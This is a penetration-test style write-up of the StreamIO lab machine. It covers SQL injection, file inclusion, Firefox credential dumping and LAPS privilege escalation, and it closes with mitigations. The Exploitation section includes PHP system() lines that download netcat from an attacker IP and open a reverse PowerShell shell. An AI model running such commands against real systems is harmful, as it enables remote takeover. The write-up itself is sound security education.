+++
date = '2025-02-21T06:43:05+01:00'
draft = false
title = 'StreamIO'
+++
# Penetration Testing Report - StreamIO.htb

**Prepared by:** blackcaesar0/SYN  

---

## 1. Executive Summary

### Purpose
The objective of this penetration test is to assess the security of **StreamIO.htb**, identifying vulnerabilities and potential attack vectors. The test covers SQL injection, file inclusion vulnerabilities, and privilege escalation.

### Scope
- **Primary Targets:** `streamio.htb`, `watch.streamio.htb`
- **Testing Methodology:** Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting

### Key Findings
- **SQL Injection** in `search.php` allowing credential extraction.
- **Remote File Inclusion (RFI)** leading to command execution.
- **Privilege Escalation** via misconfigured LAPS and user enumeration.
- **Firefox Profile Credential Dumping** allowing access to stored passwords.

### Recommendations
- Implement parameterized queries to prevent SQL injection.
- Restrict file inclusions and validate user input.
- Review user permissions and LAPS configurations to prevent privilege escalation.
---

## 2. Introduction

### Target Information
- **Domain:** `streamio.htb`
- **IP Address:** 10.129.141.95
- **Operating System:** Windows Server

### Rules of Engagement
- No **Denial of Service (DoS)** or disruptive attacks.
- Testing is limited to the **defined scope**.
- Exploits must be controlled to avoid unintended service disruption.
---

## 3. Methodology

### Enumeration
**Tools & Techniques Used:**
- `nmap`, `wfuzz` for directory and vhost enumeration.

**Findings:**
- Discovered **subdomains**: `watch.streamio.htb`, `streamio.htb`.
- Enumerated directories and parameters, identifying potential vulnerabilities.

![Screenshot](/static/streamio/dir_fuzzing.png)

![Screenshot](/static/streamio/admin_dir_fuzzing.png)

![Screenshot](/static/streamio/parameter_fuzzing.png)

### Vulnerability Analysis
**Tools & Techniques Used:**
- Burp Suite, `wfuzz` for parameter fuzzing, manual code review.

**Findings:**
- **SQL Injection (SQLi)** in `search.php` enabled credential dumping.
- **Local File Inclusion (LFI)** via the `debug` parameter allowed source code access.
- **Remote File Inclusion (RFI)** enabled arbitrary file execution.

![Screenshot](/static/streamio/sql_injection.png)

![Screenshot](/static/streamio/sql_injection_password_dump.png)

![Screenshot](/static/streamio/password_hash_cracking.png)

![Screenshot](/static/streamio/master_php_source_code.png)

### Exploitation
**Tools & Techniques Used:**
- Burp Suite, RFI exploitation, remote shell execution.

**Findings:**
- **SQL Injection** allowed retrieval of database credentials.
- **RFI vulnerability** led to reverse shell execution:
  ```php
  system("powershell -c wget 10.10.14.161/nc64.exe -outfile C:\\programdata\\nc64.exe");
  system("C:\\programdata\\nc64.exe -e powershell 10.10.14.161 4443");
  ```
- **Gained initial access** as `yoshihide`.

![Screenshot](/static/streamio/command_execution.png)

![Screenshot](/static/streamio/FI_file_download.png)

![Screenshot](/static/streamio/rev_shell.png)


### Post-Exploitation
**Tools & Techniques Used:**
- Evil-WinRM, BloodHound, `firefox_decrypt`.

**Findings:**
- Extracted **database credentials** from `inetpub/streamio.htb/admin/index.php`.
- Dumped additional credentials from **backup_streamio**.
- Found **Firefox profiles** and extracted stored credentials using `firefox_decrypt`.
- **BloodHound analysis** revealed `jdgodd` had `WriteOwner` on the `core staff` group, which could read **LAPS passwords**.
- **Privilege escalation** via LAPS misconfiguration, gaining administrative access.

![Screenshot](/static/streamio/source_code_of_master_php.png)

![Screenshot](/static/streamio/database_backup_password_dump.png)

![Screenshot](/static/streamio/database_backup_password_hash_cracking.png)

![Screenshot](/static/streamio/user_access.png)

![Screenshot](/static/streamio/firefox_login_passwords.png)

![Screenshot](/static/streamio/firefox_login_creds_dump.png)

![Screenshot](/static/streamio/bloodhound_data_collection.png)

![Screenshot](/static/streamio/graph_enum.png)

![Screenshot](/static/streamio/writeowner.png)

![Screenshot](/static/streamio/adding_jdgodd_to_core_staff.png)

![Screenshot](/static/streamio/reading_laps.png)
---

## 4. Findings

### Vulnerability 1: SQL Injection (SQLi) in `search.php`
- **Impact:** Unauthorized database access, credential dumping.
- **Risk Level:** High
- **Mitigation:** Implement parameterized queries, sanitize input.

### Vulnerability 2: Local File Inclusion (LFI) via `debug` Parameter
- **Impact:** Allowed access to sensitive source code.
- **Risk Level:** High
- **Mitigation:** Restrict user input, use allowlisted file paths.

### Vulnerability 3: Remote File Inclusion (RFI)
- **Impact:** Enabled execution of arbitrary remote files.
- **Risk Level:** Critical
- **Mitigation:** Disable remote file inclusion, implement input validation.

### Vulnerability 4: Reverse Shell via RFI
- **Impact:** Full system compromise.
- **Risk Level:** Critical
- **Mitigation:** Restrict file inclusions, apply principle of least privilege.

### Vulnerability 5: Firefox Profile Credential Dumping
- **Impact:** Access to stored passwords in the Firefox profile.
- **Risk Level:** Medium
- **Mitigation:** Use encrypted password storage, enforce MFA.

### Vulnerability 6: Privilege Escalation via LAPS Misconfiguration
- **Impact:** Allowed retrieval of administrator credentials.
- **Risk Level:** Critical
- **Mitigation:** Restrict LAPS read permissions, monitor privilege assignments.

---

## 5. Recommendations

### General Security Improvements
- **SQL Injection Mitigation:** Implement parameterized queries, sanitize user inputs.
- **File Inclusion Protection:** Restrict remote and local file inclusions, use allowlists.
- **Least Privilege Enforcement:** Regularly audit and restrict access rights.
- **LAPS Security Hardening:** Ensure only authorized accounts can read LAPS credentials.
- **Credential Storage:** Use secure password managers instead of browser storage.

### Logging & Monitoring
- **Enable centralized logging** to detect suspicious activities.
- **Monitor authentication logs** for unusual login attempts.
- **Set up intrusion detection** for SQL injection, file inclusion.
### Patching & Hardening
- **Update web application components** to mitigate known vulnerabilities.
- **Conduct regular security assessments** to identify emerging threats.

---

## 6. Conclusion
The assessment of **StreamIO.htb** revealed multiple critical security vulnerabilities, including **SQL injection, RFI, and LAPS misconfigurations**, which were successfully exploited to gain administrative access.

